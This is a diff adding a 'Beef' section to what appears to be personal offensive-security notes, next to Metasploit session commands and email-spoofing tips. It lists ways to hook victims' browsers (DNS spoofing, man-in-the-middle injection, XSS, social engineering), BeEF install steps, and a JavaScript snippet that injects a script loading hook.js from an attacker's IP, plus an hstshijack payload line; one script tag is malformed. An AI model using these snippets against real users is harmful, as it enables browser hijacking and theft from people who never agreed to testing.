@@ -35,6 +35,27 @@
 - sessions -i [N] : interact to session number 
 -  cntrl + z : background session
 
+## Beef
+To Hook:
+- DNS spoof request to a page containing the hook
+- Inject the hook in browsed pages (need MITM)
+- Use XSS exploit
+- Social enfineer the target to open a hook page
+```
+git clone https://github.com/beefproject/beef.git
+./install
+nano config.yaml
+change user and password
+<script src"http:/ip:port/hook.js"></script>
+```
+JS to inject
+```
+var imported = document.createElement('script');
+imported.src = 'http://YourIP:3000/hook.js';
+document.head.appendChild(imported);
+```
+Add to hstshijack.cap in payloads ,*:path/beef.js
+
 ## Fake Emails
 1. Use some email spoof service but they end up in spam
 	- Google spoof email
